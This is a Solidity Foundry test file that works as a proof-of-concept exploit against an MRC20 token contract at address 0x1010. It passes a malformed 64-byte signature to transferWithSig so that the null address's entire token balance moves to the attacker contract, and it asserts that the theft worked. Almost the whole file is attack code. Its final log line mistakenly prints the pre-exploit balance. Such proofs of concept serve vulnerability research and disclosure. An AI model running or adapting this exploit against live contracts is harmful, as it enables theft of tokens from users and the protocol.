// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface MRC20 {
    function transferWithSig(bytes calldata sig, uint256 amount, bytes32 data, uint256 expiration, address to)
        external
        returns (address from);
}

contract Attack is Test {
    receive() external payable {}

    function testAttack() public {
        // Address of the vulnerable contract (MRC20)
        MRC20 vuln = MRC20(address(0x1010));

        // Create a byte string of length other than 65 (invalid signature)
        bytes memory invalidSignature = new bytes(64);

        // Insert some random bytes to pass disabledHash check
        invalidSignature[12] = 0x12;
        invalidSignature[34] = 0x34;

        // Amount to transfer (full balance of null address)
        uint256 amount = IERC20(address(vuln)).balanceOf(address(0));

        uint256 attackerBalance = IERC20(address(vuln)).balanceOf(address(this));
        console.log("Attacker's balance pre-exploit:", attackerBalance);

        // Call the vulnerable function with invalid signature
        vuln.transferWithSig(invalidSignature, amount, bytes32(0), block.timestamp + 1000, address(this));

        // Check the attacker's balance after the attack
        uint256 attackerBalanceAfter = IERC20(address(vuln)).balanceOf(address(this));
        require(attackerBalanceAfter > attackerBalance, "Attack failed");
        console.log("Attack successful. Attacker's balance:", attackerBalance);
    }
}
